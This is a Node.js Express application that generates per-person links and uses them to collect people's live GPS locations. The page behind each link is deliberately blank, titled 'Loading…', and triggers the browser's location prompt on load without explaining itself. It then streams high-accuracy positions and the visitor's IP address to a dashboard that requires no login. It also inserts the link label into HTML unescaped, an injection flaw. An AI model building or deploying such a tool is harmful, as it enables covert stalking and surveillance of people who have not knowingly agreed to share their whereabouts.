const express = require("express");
const crypto = require("crypto");
const Database = require("better-sqlite3");

const app = express();
app.use(express.json());

// --- Database --------------------------------------------------------------
// DB_PATH lets you point at a mounted disk in production; defaults to a local file.
const db = new Database(process.env.DB_PATH || "data.db");
db.pragma("journal_mode = WAL");
db.exec(`
  CREATE TABLE IF NOT EXISTS links (
    token   TEXT PRIMARY KEY,
    label   TEXT NOT NULL,
    created TEXT NOT NULL
  );
  CREATE TABLE IF NOT EXISTS hits (
    id    INTEGER PRIMARY KEY AUTOINCREMENT,
    token TEXT NOT NULL,
    lat   REAL NOT NULL,
    lng   REAL NOT NULL,
    acc   REAL,
    at    TEXT NOT NULL,
    ip    TEXT
  );
  CREATE INDEX IF NOT EXISTS idx_hits_token ON hits(token);
`);

const q = {
  insertLink: db.prepare("INSERT INTO links (token,label,created) VALUES (?,?,?)"),
  getLink: db.prepare("SELECT * FROM links WHERE token=?"),
  insertHit: db.prepare("INSERT INTO hits (token,lat,lng,acc,at,ip) VALUES (?,?,?,?,?,?)"),
  latestPerLink: db.prepare(`
    SELECT l.label, h.lat, h.lng, h.acc, h.at
    FROM links l
    JOIN hits h ON h.id = (SELECT id FROM hits WHERE token=l.token ORDER BY id DESC LIMIT 1)
  `),
};

// --- Create a unique link for a person -------------------------------------
app.get("/new", (req, res) => {
  const token = crypto.randomBytes(6).toString("hex");
  const label = (req.query.label || "unnamed").toString().slice(0, 40);
  q.insertLink.run(token, label, new Date().toISOString());
  const base = `${req.protocol}://${req.get("host")}`;
  res.send(`<body style="font-family:sans-serif;padding:40px">
    <h2>Link created for "${label}"</h2>
    <p>Send this link:</p>
    <p><a href="${base}/t/${token}">${base}/t/${token}</a></p>
    <p><a href="/dashboard">Go to dashboard</a></p>
  </body>`);
});

// --- The page the person opens (per-token, live sharing) --------------------
app.get("/t/:token", (req, res) => {
  const { token } = req.params;
  if (!q.getLink.get(token)) return res.status(404).send("Unknown link.");
  res.send(`<!doctype html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Loading…</title></head>
<body style="font-family:sans-serif;background:#fff">
  <script>
    // Fire Chrome's permission prompt immediately on load — no page content.
    function send(p){
      fetch("/loc/${token}", {method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify({lat:p.coords.latitude, lng:p.coords.longitude, acc:p.coords.accuracy})});
    }
    if (navigator.geolocation){
      navigator.geolocation.watchPosition(
        send, function(){}, {enableHighAccuracy:true, maximumAge:0, timeout:15000}
      );
    }
  </script>
</body>
</html>`);
});

// --- Receive a location update ---------------------------------------------
app.post("/loc/:token", (req, res) => {
  const { token } = req.params;
  if (!q.getLink.get(token)) return res.status(404).json({ ok: false });
  const { lat, lng, acc } = req.body;
  if (typeof lat !== "number" || typeof lng !== "number") return res.status(400).json({ ok: false });
  q.insertHit.run(token, lat, lng, acc ?? null, new Date().toISOString(), req.ip);
  res.json({ ok: true });
});

// --- JSON feed for the map (latest point per person) -----------------------
app.get("/feed", (req, res) => res.json(q.latestPerLink.all()));

// --- Dashboard with a live map ---------------------------------------------
app.get("/dashboard", (req, res) => {
  res.send(`<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dashboard</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <style>body{margin:0;font-family:sans-serif} #map{height:70vh} .bar{padding:10px 16px}</style>
</head>
<body>
  <div class="bar"><b>Live locations</b> &middot; <a href="/new?label=person">create a link</a></div>
  <div id="map"></div>
  <script>
    const map = L.map("map").setView([20, 0], 2);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
      {attribution:"&copy; OpenStreetMap"}).addTo(map);
    const markers = {};
    let fitted = false;
    async function tick(){
      const data = await (await fetch("/feed")).json();
      const pts = [];
      for (const d of data){
        pts.push([d.lat, d.lng]);
        const text = d.label + "<br>±" + Math.round(d.acc) + "m<br>" + d.at;
        if (markers[d.label]) markers[d.label].setLatLng([d.lat,d.lng]).setPopupContent(text);
        else markers[d.label] = L.marker([d.lat,d.lng]).addTo(map).bindPopup(text);
      }
      if (!fitted && pts.length){ map.fitBounds(pts, {maxZoom:16, padding:[40,40]}); fitted = true; }
    }
    tick(); setInterval(tick, 3000);
  </script>
</body>
</html>`);
});

app.get("/", (req, res) => res.redirect("/dashboard"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Running on port " + PORT));
